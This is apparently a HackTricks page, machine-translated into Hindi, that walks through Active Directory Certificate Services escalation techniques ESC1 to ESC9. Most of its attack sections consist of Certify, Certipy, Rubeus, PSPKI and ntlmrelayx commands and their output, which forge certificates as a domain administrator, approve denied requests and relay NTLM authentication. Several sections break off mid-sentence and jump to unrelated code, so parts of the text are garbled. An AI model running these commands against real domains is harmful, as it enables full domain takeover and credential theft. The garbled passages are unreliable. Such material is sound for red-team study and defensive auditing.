# एडी सीएस डोमेन एस्कलेशन

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos में PRs सबमिट करके।

</details>

**यह पोस्टों का सारांश है:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## गलत रूप से कॉन्फ़िगर किए गए सर्टिफिकेट टेम्पलेट्स - ESC1

### स्पष्टीकरण

### गलत रूप से कॉन्फ़िगर किए गए सर्टिफिकेट टेम्पलेट्स - ESC1 का विवरण

* **उच्च-विशेषाधिकारित उपयोगकर्ताओं को उद्यम CA द्वारा नामांकन अधिकार प्रदान किए जाते हैं।**
* **मैनेजर की मंजूरी की आवश्यकता नहीं है।**
* **अधिकृत कर्मचारियों के हस्ताक्षर की आवश्यकता नहीं है।**
* **सर्टिफिकेट टेम्पलेट्स पर सुरक्षा विवरण अत्यधिक अनुमति देते हैं, जिससे उच्च-विशेषाधिकारित उपयोगकर्ताएं नामांकन अधिकार प्राप्त कर सकते हैं।**
* **सर्टिफिकेट टेम्पलेट्स को प्रमाणीकरण करने के लिए EKU को परिभाषित किया गया है जो प्रमाणीकरण को सुविधाजनक बनाते हैं:**
* विस्तारित कुंजी उपयोग (EKU) पहचानकरण को सुविधाजनक बनाने वाले अंक जैसे क्लाइंट प्रमाणीकरण (OID 1.3.6.1.5.5.7.3.2), PKINIT क्लाइंट प्रमाणीकरण (1.3.6.1.5.2.3.4), स्मार्ट कार्ड लॉगऑन (OID 1.3.6.1.4.1.311.20.2.2), कोई उद्देश्य (OID 2.5.29.37.0), या कोई EKU नहीं (SubCA) शामिल हैं।
* **अनुरोधकर्ताओं को सर्टिफिकेट साइनिंग अनुरोध (CSR) में subjectAltName शामिल करने की अनुमति टेम्पलेट द्वारा दी गई है:**
* यदि मौजूद है, तो सक्रिय निर्देशिका (AD) प्रमाणीकरण के लिए सर्टिफिकेट में subjectAltName (SAN) को प्राथमिकता देती है। इसका मतलब है कि एक CSR में SAN को निर्दिष्ट करके, किसी भी उपयोगकर्ता (जैसे डोमेन प्रशासक) का प्रतिनिधित्व करने के लिए एक सर्टिफिकेट का अनुरोध किया जा सकता है। यह दर्शाता है कि अनुरोधकर्ता द्वारा SAN को निर्दिष्ट किया जा सकता है यह सर्टिफिकेट टेम्पलेट के AD ऑब्जेक्ट के माध्यम से `mspki-certificate-name-flag` संपत्ति में सूचित किया जाता है। यह संपत्ति एक बिटमास्क है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` झंडा की उपस्थिति अनुरोधकर्ता द्वारा SAN की निर्दिष्टि की अनुमति देती है।

{% hint style="danger" %}
उपरोक्त कॉन्फ़िगरेशन उच्च-विशेषाधिकारित उपयोगकर्ताओं को किसी भी चयनित SAN के साथ सर्टिफिकेट अनुरोध करने की अनुमति देता है, जिससे केरबेरोस या एसचैनल के माध्यम से किसी भी डोमेन प्रिंसिपल के रूप में प्रमाणीकरण किया जा सकता है।
{% endhint %}

यह सुविधा कभी-कभी HTTPS या होस्ट सर्टिफिकेट का तत्काल उत्पादन करने का समर्थन करने के लिए सक्षम की जाती है, उत्पादों या डिप्लॉयमेंट सेवाओं द्वारा, या समझौते की कमी के कारण।

इसे ध्यान में रखा जाता है कि इस विकल्प के साथ एक सर्टिफिकेट बनाने पर चेतावनी दी जाती है, जो ऐसा मामला नहीं है जब कोई मौजूदा सर्टिफिकेट टेम्पलेट (जैसे `WebServer` टेम्पलेट, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम है) की प्रतिलिपि बनाई जाती है और फिर उसे संशोधित करके प्रमाणीकरण OID शामिल किया जाता है।

### दुरुपयोग

**विकल्पी सर्टिफिकेट टेम्पलेट्स** खोजने के लिए आप निम्नलिखित को चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**इस कमजोरी का दुरुपयोग करके एडमिनिस्ट्रेटर की भूमिका अभिमानित करने** के लिए निम्नलिखित को चला सकते हैं:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
तब आप उत्पन्न **प्रमाणपत्र को `.pfx`** प्रारूप में परिवर्तित कर सकते हैं और इसका उपयोग करके फिर से **Rubeus या certipy का उपयोग करके प्रमाणीकरण** कर सकते हैं:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows बाइनरी "Certreq.exe" और "Certutil.exe" का उपयोग PFX उत्पन्न करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD वन्यजीवन के विन्यास स्कीमा में प्रमाणपत्र टेम्पलेट की जाँच, विशेष रूप से उन टेम्पलेटों की, जिन्हें मंजूरी या हस्ताक्षर की आवश्यकता नहीं है, जिनमें एक ग्राहक प्रमाणीकरण या स्मार्ट कार्ड लॉगऑन EKU है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ध्वज सक्षम है, निम्नलिखित LDAP क्वेरी चलाकर किया जा सकता है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## गलत रूप से कॉन्फ़िगर किए गए सर्टिफिकेट टेम्पलेट्स - ESC2

### स्पष्टीकरण

दूसरे दुरुपयोग स्थिति में पहले वाले का एक रूप है:

1. उच्च-अधिकारिता वाले उपयोगकर्ताओं को उद्यम CA द्वारा पंजीकरण के अधिकार प्रदान किए जाते हैं।
2. प्रबंधक स्वीकृति की आवश्यकता निषेधित की जाती है।
3. अधिकृत हस्ताक्षरों की आवश्यकता छूट दी जाती है।
4. सर्टिफिकेट टेम्पलेट पर अत्यधिक अनुमतिपूर्ण सुरक्षा विवरण उचित अधिकार वाले उपयोगकर्ताओं को सर्टिफिकेट पंजीकरण के अधिकार प्रदान करता है।
5. **सर्टिफिकेट टेम्पलेट को किसी भी उद्देश्य EKU या कोई EKU शामिल किया गया है।**

**किसी भी उद्देश्य EKU** एक आक्रमणकर्ता को **किसी भी उद्देश्य**, जैसे क्लाइंट प्रमाणीकरण, सर्वर प्रमाणीकरण, कोड साइनिंग, आदि के लिए प्राप्त करने की अनुमति देता है। इसी **तकनीक का उपयोग ESC3 के लिए** इस स्थिति का शोषण करने के लिए किया जा सकता है।

**कोई EKU वाले सर्टिफिकेट** जो उप-CA सर्टिफिकेट के रूप में कार्य करते हैं, **किसी भी उद्देश्य** के लिए शोषित किए जा सकते हैं और **नए सर्टिफिकेटों को साइन करने के लिए भी उपयोग किए जा सकते हैं**। इसलिए, एक आक्रमणकर्ता उप-CA सर्टिफिकेट का उपयोग करके नए सर्टिफिकेटों में विभिन्न EKUs या क्षेत्रों को निर्दिष्ट कर सकता है।

हालांकि, **डोमेन प्रमाणीकरण** के लिए नए सर्टिफिकेट उपयोगी नहीं होंगे अगर उप-CA को **`NTAuthCertificates`** ऑब्ज
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## गलत रूप से एनरोलमेंट एजेंट टेम्पलेट्स - ESC3

### स्पष्टीकरण

यह परिदृश्य पहले और दूसरे के समान है, लेकिन एक **विभिन्न EKU** (सर्टिफिकेट रिक्वेस्ट एजेंट) का **दुरुपयोग** कर रहा है और **2 विभिन्न टेम्पलेट** है (इसलिए इसमें 2 सेट की आवश्यकताएं हैं),

**सर्टिफिकेट रिक्वेस्ट एजेंट EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे माइक्रोसॉफ्ट दस्तावेज़ में **एनरोलमेंट एजेंट** के रूप में जाना जाता है, किसी प्रधान को दूसरे उपयोगकर्ता के लिए सर्टिफिकेट के लिए **एनरोल** करने की अनुमति देता है।

**“एनरोलमेंट एजेंट”** ऐसे एक **टेम्पलेट** में एनरोल होता है और परिणामस्वरूप **दूसरे उपयोगकर्ता के लिए CSR को सह-साइन करने के लिए प्राप्त सर्टिफिकेट का उपयोग करता है**। फिर यह **सह-साइन किए गए CSR** को सीए को भेजता है, जो एक **टेम्पलेट में एनरोल करता है जो “किसी के लिए एनरोल करने की अनुमति देता है”**, और सीए एक **“दूसरे” उपयोगकर्ता के लिए सर्टिफिकेट देता है**।

**आवश्यकताएं 1:**

- उच्च-अधिकारी उपयोगकर्ताओं को उच्च-अधिकारी सीए द्वारा एनरोलमेंट अधिकार प्रदान किए जाते हैं।
- प्रबंधक स्वीकृति के लिए आवश्यकता छूट दी गई है।
- अधिकृत हस्ताक्षरों के लिए कोई आवश्यकता नहीं है।
- सर्टिफिकेट टेम्पलेट का सुरक्षा विवरण अत्यधिक अनुमति देने वाला है, जिससे उच्च-अधिकारी उपयोगकर्ताओं को एनरोलमेंट अधिकार प्रदान किए जाते हैं।
- सर्टिफिकेट टेम्पलेट में सर्टिफिकेट रिक्वेस्ट एजेंट EKU शामिल है, जो अन्य प्रधानों के लिए अन्य सर्टिफिकेट टेम्पलेट का अनुरोध करने की अनुमति देता है।

**आवश्यकताएं 2:**

- उच्च-अधिकारी सीए उच्च-अधिकारी उपयोगकर्ताओं को एनरोलमेंट अधिकार प्रदान करता है।
- प्रबंधक स्वीकृति को छोड़ दिया गया है।
- टेम्पलेट का स्कीमा संस्करण या 1 है या 2 से अधिक है, और यह एक एप्लिकेशन पॉलिसी इश्यूअंस आवश्यकता निर्धारित करता है जो सर्टिफिकेट रिक्वेस्ट एजेंट EKU की आवश्यकता है।
- सर्टिफिकेट टेम्पलेट में परिभाषित एक EKU डोमेन प्रमाणीकरण की अनुमति देता है।
- सीए पर एनरोलमेंट एजेंटों के लिए प्रतिबंध लागू नहीं हैं।

### दुरुपयोग

आप इस परिदृश्य का दुरुपयोग करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**उपयोगकर्ता** जिन्हें **एनरोलमेंट एजेंट सर्टिफिकेट** प्राप्त करने की अनुमति है, उन टेम्पलेट्स में जिनमें एनरोलमेंट **एजेंट्स** को एनरोल करने की अनुमति है, और जिनके लिए एनरोलमेंट एजेंट कार्रवाई कर सकता है, उन्हें उद्यम CA द्वारा प्रतिबंधित किया जा सकता है। इसे `certsrc.msc` **स्नैप-इन** खोलकर, CA पर **दायाँ क्लिक** करके, **संपत्ति** पर क्लिक करके, और फिर “एनरोलमेंट एजेंट्स” टैब पर **नेविगेट** करके प्राप्त किया जाता है।

हालांकि, यह नोट किया गया है कि CA के लिए **डिफ़ॉल्ट** सेटिंग “**एनरोलमेंट एजेंट्स को प्रतिबंधित न करें**” है। जब एनरोलमेंट एजेंट्स पर प्रतिबंध व्यवस्थापकों द्वारा सक्षम किया जाता है, तो इसे “एनरोलमेंट एजेंट्स को प्रतिबंधित करें” पर सेट करने पर डिफ़ॉल्ट विन्यास अत्यंत अनुमोदनशील रहता है। यह सभी टेम्पलेट्स में किसी भी व्यक्ति के रूप में **सभी को** पहुंचने की अनुमति देता है।
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** एक एकल कमांड के साथ सर्टिफिकेट टेम्प्लेट के कॉन्फ़िगरेशन को अधिलेखित कर सकता है। **डिफ़ॉल्ट** रूप से, Certipy कॉन्फ़िगरेशन को **ESC1 के लिए वंशावधि** बनाने के लिए अधिलेखित करेगा। हम **पुरानी कॉन्फ़िगरेशन को सहेजने के लिए `-save-old` पैरामीटर** भी निर्दिष्ट कर सकते हैं, जो हमारे हमले के बाद कॉन्फ़िगरेशन को **पुनर्स्थापित** करने के लिए उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## वंलरेबल पीकेआई ऑब्जेक्ट एक्सेस कंट्रोल - ESC5

### स्पष्टीकरण

जो व्यापक वेब है जिसमें संबंधित ACL आधारित संबंध है, जिसमें प्रमाणपत्र टेम्पलेट्स और प्रमाणपत्र प्राधिकरण से अधिक कई ऑब्ज
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
यह ऑपरेशन मुख्य रूप से **दूरस्थ रजिस्ट्री एक्सेस** का उपयोग करता है, इसलिए, एक वैकल्पिक दृष्टिकोण हो सकता है:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools जैसे [**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) इस गलत विन्यास का पता लगा सकते हैं और इसका शोषण कर सकते हैं:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
इन सेटिंग्स को बदलने के लिए, मानते हुए कि किसी के पास **डोमेन प्रशासनिक** अधिकार हैं या समकक्ष, निम्नलिखित कमांड को किसी भी कार्यस्थल से निष्पादित किया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
किसी भी वातावरण में इस कॉन्फ़िगरेशन को अक्षम करने के लिए, ध्वज को हटा दिया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
मई 2022 सुरक्षा अपड
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
यह मुख्य अधिकारों, अर्थात **`ManageCA`** और **`ManageCertificates`**, के बारे में अवलोकन प्रदान करता है, जो "CA प्रशासक" और "प्रमाणपत्र प्रबंधक" की भूमिकाओं के संबंध में हैं।

#### दुरुपयोग

प्रमाणपत्र प्राधिकरण पर **`ManageCA`** अधिकार होने से सिद्धांतलगाता को PSPKI का उपयोग करके दूरस्थ सेटिंग को परिवर्तित करने की अनुमति मिलती है। इसमें **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ध्वज को टॉगल करना शामिल है ताकि किसी भी टेम्पलेट में SAN विशिष्टीकरण की अनुमति हो, जो डोमेन उन्नति का एक महत्वपूर्ण पहलू है।

इस प्रक्रिया को सरल बनाने के लिए PSPKI के **Enable-PolicyModuleFlag** cmdlet का उपयोग किया जा सकता है, जो सीधे GUI बातचीत के बिना संशोधन की अनुमति देता है।

**`ManageCertificates`** अधिकार के स्वामित्व से लंबित अनुरोधों को मंजूरी देने में सहायक होता है, जो "CA प्रमाणपत्र प्रबंधक मंजूरी" सुरक्षा उपाय को दौर करने में सक्षम होता है।

**Certify** और **PSPKI** मॉड्यूलों का संयोजन प्रमाणपत्र का अनुरोध करने, मंजूरी देने, और डाउनलोड करने के लिए उपयोग किया जा सकता है:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### हमला 2

#### स्पष्टीकरण

{% hint style="warning" %}
**पिछले हमले** में **`Manage CA`** अनुमतियों का उपयोग किया गया था ताकि **EDITF\_ATTRIBUTESUBJECTALTNAME2** ध्वज को सक्रिय किया जा सके जिससे **ESC6 हमला** किया जा सके, लेकिन यह कोई प्रभाव नहीं डालेगा जब तक CA सेवा (`CertSvc`) को पुनरारंभ नहीं किया जाता। जब एक उपयोगकर्ता के पास `Manage CA` एक्सेस अधिकार होते हैं, तो उपयोगकर्ता को सेवा को पुनरारंभ करने की भी अनुमति होती है। हालांकि, यह यह नहीं मतलब है कि उपयोगकर्ता सेवा को दूरस्थ से पुनरारंभ कर सकता है। इसके अतिरिक्त, अधिकांश पैच किए गए वातावरणों में मई 2022 सुरक्षा अपडेट के कारण **ESC6** अधिकांश काम नहीं कर सकता है।
{% endhint %}

इसलिए, यहां एक और हमला प्रस्तुत किया जा रहा है।

आवश्यकताएं:

* केवल **`ManageCA` अनुमति**
* **`Manage Certificates`** अनुमति (इसे **`ManageCA`** से प्रदान किया जा सकता है)
* प्रमाणपत्र टेम्पलेट **`SubCA`** को **सक्रिय** होना चाहिए (इसे **`ManageCA`** से सक्रिय किया जा सकता है)

यह तकनीक उस तथ्य पर निर्भर करती है कि उपयोगकर्ता जिनके पास `Manage CA` _और_ `Manage Certificates` एक्सेस अधिकार हैं, वे **विफल प्रमाणपत्र अनुरोध** जारी कर सकते हैं। **`SubCA`** प्रमाणपत्र टेम्पलेट **ESC1 के लिए वंशावश** है, लेकिन **केवल प्रशासक** प्रमाणपत्र टेम्पलेट में नामांकित हो सकते हैं। इसलिए, एक **उपयोगकर्ता** **`SubCA`** में नामांकित होने का **अनुरोध** कर सकता है - जिसे **इनकार** किया जाएगा - लेकिन **फिर प्रबंधक द्वारा जारी** किया जाएगा।

#### दुरुपयोग

आप अपने आप को **`Manage Certificates`** एक्सेस अधिकार प्रदान कर सकते हैं अपने उपयोगकर्ता को एक नए अधिकारी के रूप में जोड़कर।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** टेम्पलेट को `-enable-template` पैरामीटर के साथ CA पर सक्रिय किया जा सकता है। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्रिय होता है।
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हम इस हमले के लिए पूर्वापेक्षाएं पूरी कर चुके हैं, तो हम **`SubCA` टेम्प्लेट पर आधारित प्रमाणपत्र का अनुरोध करना शुरू कर सकते हैं**।

**यह अनुरोध अस्वीकृत किया जाएगा**, लेकिन हम निजी कुंजी को सहेजेंगे और अनुरोध आईडी नोट करेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
अपने **`Manage CA` और `Manage Certificates`** के साथ, हम फिर `ca` कमांड और `-issue-request <request ID>` पैरामीटर के साथ विफल प्रमाणपत्र अनुरोध जारी कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर के साथ **जारी प्रमाणपत्र प्राप्त कर सकते हैं**।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM रिले से एडी सीएस एचटीटीपैंट्स तक एस्केलेशन - ESC8

### स्पष्टीकरण

{% hint style="info" %}
ऐसे वातावरणों में जहां **एडी सीएस स्थापित है**, यदि एक **वेब नामांकन अंत्यःस्थल संवर्जित** है और कम से कम एक **प्रमाणपत्र टेम्पलेट प्रकाशित है** जो **डोमेन कंप्यूटर नामांकन और ग्राहक प्रमाणीकरण** की अनुमति देता है (जैसे कि डिफ़ॉल्ट **`Machine`** टेम्पलेट), तो **किसी भी कंप्यूटर को हमला करने की संभावना होती है जिसमें एक हमलावर द्वारा सक्रिय स्पूलर सेवा हो**!
{% endhint %}

कई **एडी सीएस** द्वारा **समर्थित एचटीटीपैंट्स नामांकन विध
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` संपत्ति का उपयोग कारपोरेट सर्टिफिकेट प्राधिकरणों (CAs) द्वारा सर्टिफिकेट एनरोलमेंट सेवा (CES) एंडपॉइंट्स स्टोर करने के लिए किया जाता है। इन एंडपॉइंट्स को उपयोग करके उपकरण **Certutil.exe** का उपयोग करके सूचीबद्ध किया जा सकता है:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### प्रमाणपत्र के साथ दुरुपयोग
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) के साथ दुरुपयोग

सर्टिफिकेट का अनुरोध डिफ़ॉल्ट रूप से Certipy द्वारा किया जाता है जो टेम्प्लेट `Machine` या `User` पर आधारित होता है, जो यह निर्धारित करता है कि खाता नाम क्या है जिस पर आधारित है, यह `$` से समाप्त होता है। वैकल्पिक टेम्प्लेट का निर्धारण `-template` पैरामीटर का उपयोग करके किया जा सकता है।

फिर [PetitPotam](https://github.com/ly4k/PetitPotam) जैसी एक तकनीक का उपयोग किया जा सकता है जो प्रमाणीकरण को मजबूर करने के लिए होती है। जब डोमेन कंट्रोलर्स के साथ काम किया जाता है, तो `-template DomainController` का निर्दिष्ट करना आवश्यक है।
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## कोई सुरक्षा एक्सटेंशन - ESC9 <a href="#5485" id="5485"></a>

### स्पष्टीकरण

नए मान **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) के लिए **`msPKI-Enrollment-Flag`** के लिए ESC9 के रूप में संदर्भित, एक सुरक्षा एक्सटेंशन को प्रमाणपत्र में समाहित करने से रोकता है। यह ध्वज `StrongCertificateBindingEnforcement` को `1` पर सेट किया जाता है (डिफ़ॉल्ट सेटिंग), जो `2` पर सेटिंग के साथ विपरीत है। इसका महत्व उचित है जब `Kerberos` या `Schannel` के लिए एक कमजोर प्रमाणपत्र मैपिंग का शोध किया जा सकता है (जैसे ESC10 में), क्योंकि ESC9 की अनुपस्थिति आवश्यकताओं को बदल नहीं देगी।

इस ध्वज की सेटिंग महत्वपूर्ण होने की स्थितियाँ शामिल हैं:
- `StrongCertificateBindingEnforcement` को `2` पर समायोजित नहीं किया गया है (जिसका डिफ़ॉल्ट `1` है), या `CertificateMappingMethods` में `UPN` ध्वज शामिल है।
- प्रमाणपत्र को `msPKI-Enrollment-Flag` सेटिंग के भीतर `CT_FLAG_NO_SECURITY_EXTENSION` ध्वज से चिह्नित किया गया है।
- प्रमाणपत्र द्वारा कोई भी क्लाइंट प्रमाणीकरण EKU निर्दिष्ट किया गया है।
- किसी भी खाते पर `GenericWrite` अनुमतियाँ उपलब्ध हैं जिसका उपयोग करके किसी अन्य को कमजोर करने के लिए।

### दुरुपयोग स्थिति

मान लें `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` अनुमतियाँ हैं, जिनका लक्ष्य `Administrator@corp.local` को कमजोर करना है। `ESC9` प्रमाणपत्र टेम्पलेट, जिसे `Jane@corp.local` को नमंजूरी है, अपनी `msPKI-Enrollment-Flag` सेटिंग में `CT_FLAG_NO_SECURITY_EXTENSION` ध्वज के साथ कॉन्फ़िगर किया गया है।

शुरू में, `Jane` का हैश शैडो क्रेडेंशियल का उपयोग करके प्राप्त किया जाता है, धन्यवाद `John` के `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
इसके बाद, `Jane` का `userPrincipalName` `Administrator` में संशोधित किया जाता है, जानबूझकर `@corp.local` डोमेन हिस्सा छोड़ दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
यह संशोधन बाधाएं उल्लंघित नहीं करता है, क्योंकि `Administrator@corp.local` को `Administrator` का `userPrincipalName` अलग रूप से बना रहता है।

इसके बाद, `ESC9` प्रमाणपत्र टेम्पलेट, जिसे विकल्पित माना गया है, `Jane` के रूप में अनुरोध किया जाता है:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
यह नोट किया गया है कि प्रमाणपत्र का `userPrincipalName` `Administrator` को प्रकट करता है, किसी भी "ऑब्जेक्ट SID" के बिना।

`Jane` का `userPrincipalName` फिर से उसके मूल, `Jane@corp.local` पर लौटाया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
